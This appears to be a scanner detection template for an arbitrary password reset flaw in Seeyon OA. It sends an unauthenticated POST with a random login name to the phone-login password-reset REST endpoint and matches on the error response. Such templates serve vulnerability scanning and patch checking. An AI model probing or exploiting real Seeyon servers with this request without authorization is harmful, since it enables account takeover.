id: poc-yaml-seeyon-oa-password-reset
info:
  name: Seeyon OA Arbitrary Password Reset
  author: ProjectDiscoveryAI
  severity: critical
  tags: password-reset

variables:
  v1: "{{rand_text_alphanumeric(10)}}"

http:
  - method: POST
    path:
      - "/seeyon/rest/phoneLogin/phoneCode/resetPassword"
    headers:
      Content-Type: application/json
    body: |
      {"loginName":"{{v1}}"}

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 500
      - type: word
        part: body
        words:
          - "\"success\" : false,"
          - "\"message\" : null"
      - type: word
        part: body
        words:
          - "非法操作"
        negative: true
